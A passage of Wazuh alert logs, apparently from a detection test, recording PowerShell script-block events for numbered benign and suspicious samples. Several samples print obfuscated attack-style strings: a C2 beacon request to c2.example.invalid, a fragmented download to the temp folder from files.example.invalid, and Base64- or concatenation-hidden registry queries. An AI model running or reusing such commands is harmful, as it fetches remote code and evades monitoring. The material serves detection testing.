\\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-117'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3f3ee02a-fd51-4446-ad9f-d3cba8717bbc\"}}}","id":"1784280981.477529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:21.667+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"edd276e0-7122-4b23-a980-2bec139d4cb2","scriptBlockText":"$sampleId='PST-118'; powercfg /L; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722431","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-118'; powercfg /L; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: edd276e0-7122-4b23-a980-2bec139d4cb2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:21.3723583Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:21.3723583Z\",\"eventRecordID\":\"722431\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-118'; powercfg /L; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: edd276e0-7122-4b23-a980-2bec139d4cb2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-118'; powercfg /L; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"edd276e0-7122-4b23-a980-2bec139d4cb2\"}}}","id":"1784280981.477529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:21.677+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f0d2f4ba-64a5-4122-965a-3983df454beb","scriptBlockText":"$sampleId='PST-119'; [xml]$xml = '&lt;inventory&gt;&lt;host name=\\\"ws-01\\\"&gt;&lt;state&gt;ok&lt;/state&gt;&lt;/host&gt;&lt;/inventory&gt;'; $xml.inventory.host.state; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722445","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-119'; [xml]$xml = '<inventory><host name=\"ws-01\"><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f0d2f4ba-64a5-4122-965a-3983df454beb\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:21.7546500Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:21.7546500Z\",\"eventRecordID\":\"722445\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-119'; [xml]$xml = '<inventory><host name=\\\"ws-01\\\"><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f0d2f4ba-64a5-4122-965a-3983df454beb\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-119'; [xml]$xml = '&lt;inventory&gt;&lt;host name=\\\\\\\"ws-01\\\\\\\"&gt;&lt;state&gt;ok&lt;/state&gt;&lt;/host&gt;&lt;/inventory&gt;'; $xml.inventory.host.state; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f0d2f4ba-64a5-4122-965a-3983df454beb\"}}}","id":"1784280982.477529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:22.768+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fb546f54-1b5a-4f17-9911-bfabbce2e6c7","scriptBlockText":"$sampleId='PST-120'; $encoded='RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722448","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-120'; $encoded='RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fb546f54-1b5a-4f17-9911-bfabbce2e6c7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:22.1061534Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:22.1061534Z\",\"eventRecordID\":\"722448\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-120'; $encoded='RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fb546f54-1b5a-4f17-9911-bfabbce2e6c7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-120'; $encoded='RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fb546f54-1b5a-4f17-9911-bfabbce2e6c7\"}}}","id":"1784280982.479926","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":12,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:22.775+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8694f25b-9c8b-47d2-a04e-6d4a85e2b05e","scriptBlockText":"$sampleId='PST-121'; $indicator='Get-Ite' + 'mPrope' + 'rty -Path' + ' ''HKL' + 'M:\\\\Softw' + 'are\\\\Microso' + 'ft\\\\Win' + 'dows\\\\Curre' + 'ntVersion\\\\Uni' + 'nstall\\\\*'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722452","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-121'; $indicator='Get-Ite' + 'mPrope' + 'rty -Path' + ' ''HKL' + 'M:\\Softw' + 'are\\Microso' + 'ft\\Win' + 'dows\\Curre' + 'ntVersion\\Uni' + 'nstall\\*'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8694f25b-9c8b-47d2-a04e-6d4a85e2b05e\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:22.4398308Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:22.4398308Z\",\"eventRecordID\":\"722452\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-121'; $indicator='Get-Ite' + 'mPrope' + 'rty -Path' + ' ''HKL' + 'M:\\\\Softw' + 'are\\\\Microso' + 'ft\\\\Win' + 'dows\\\\Curre' + 'ntVersion\\\\Uni' + 'nstall\\\\*'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8694f25b-9c8b-47d2-a04e-6d4a85e2b05e\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-121'; $indicator='Get-Ite' + 'mPrope' + 'rty -Path' + ' ''HKL' + 'M:\\\\\\\\Softw' + 'are\\\\\\\\Microso' + 'ft\\\\\\\\Win' + 'dows\\\\\\\\Curre' + 'ntVersion\\\\\\\\Uni' + 'nstall\\\\\\\\*'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8694f25b-9c8b-47d2-a04e-6d4a85e2b05e\"}}}","id":"1784280982.479926","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:22.785+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b7b5f1f8-293b-40ff-83da-a354076a0ba8","scriptBlockText":"$sampleId='PST-122'; $indicator='$profile=@{Sleep=60000;Jitter=0.25;UserAgent=''Mozilla/5.0'';Uri=''/api/v1/status''}; Invoke-WebRequest -Uri ''https://c2.example.invalid/api/v1/status'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722467","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-122'; $indicator='$profile=@{Sleep=60000;Jitter=0.25;UserAgent=''Mozilla/5.0'';Uri=''/api/v1/status''}; Invoke-WebRequest -Uri ''https://c2.example.invalid/api/v1/status'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b7b5f1f8-293b-40ff-83da-a354076a0ba8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:22.7711148Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:22.7711148Z\",\"eventRecordID\":\"722467\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-122'; $indicator='$profile=@{Sleep=60000;Jitter=0.25;UserAgent=''Mozilla/5.0'';Uri=''/api/v1/status''}; Invoke-WebRequest -Uri ''https://c2.example.invalid/api/v1/status'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b7b5f1f8-293b-40ff-83da-a354076a0ba8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-122'; $indicator='$profile=@{Sleep=60000;Jitter=0.25;UserAgent=''Mozilla/5.0'';Uri=''/api/v1/status''}; Invoke-WebRequest -Uri ''https://c2.example.invalid/api/v1/status'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b7b5f1f8-293b-40ff-83da-a354076a0ba8\"}}}","id":"1784280983.479926","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:23.330+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c3d9b757-0bd0-4093-bacd-4d4e7b60c53d","scriptBlockText":"$sampleId='PST-123'; $settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722468","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-123'; $settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c3d9b757-0bd0-4093-bacd-4d4e7b60c53d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:23.1092787Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:23.1092787Z\",\"eventRecordID\":\"722468\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-123'; $settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c3d9b757-0bd0-4093-bacd-4d4e7b60c53d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-123'; $settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c3d9b757-0bd0-4093-bacd-4d4e7b60c53d\"}}}","id":"1784280983.479926","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:23.335+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1e102a03-017e-4ff7-b71b-09d3dc1caad4","scriptBlockText":"$sampleId='PST-124'; $parts=@('Invok','e-WebR','equest',' -Uri ''ht','tps://file','s.example','.invalid/u','pdate.bin'' ','-OutF','ile ''$','env:TEMP\\\\upda','te.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722509","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-124'; $parts=@('Invok','e-WebR','equest',' -Uri ''ht','tps://file','s.example','.invalid/u','pdate.bin'' ','-OutF','ile ''$','env:TEMP\\upda','te.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1e102a03-017e-4ff7-b71b-09d3dc1caad4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:24.1226108Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:24.1226108Z\",\"eventRecordID\":\"722509\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-124'; $parts=@('Invok','e-WebR','equest',' -Uri ''ht','tps://file','s.example','.invalid/u','pdate.bin'' ','-OutF','ile ''$','env:TEMP\\\\upda','te.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1e102a03-017e-4ff7-b71b-09d3dc1caad4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-124'; $parts=@('Invok','e-WebR','equest',' -Uri ''ht','tps://file','s.example','.invalid/u','pdate.bin'' ','-OutF','ile ''$','env:TEMP\\\\\\\\upda','te.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1e102a03-017e-4ff7-b71b-09d3dc1caad4\"}}}","id":"1784280984.479926","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:24.818+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e91554ce-d24d-4586-ba2f-e7490774b484","scriptBlockText":"$sampleId='PST-125'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722512","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-125'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e91554ce-d24d-4586-ba2f-e7490774b484\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:24.4488386Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:24.4488386Z\",\"eventRecordID\":\"722512\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-125'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e91554ce-d24d-4586-ba2f-e7490774b484\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-125'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e91554ce-d24d-4586-ba2f-e7490774b484\"}}}","id":"1784280984.479926","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:24.839+0200"}
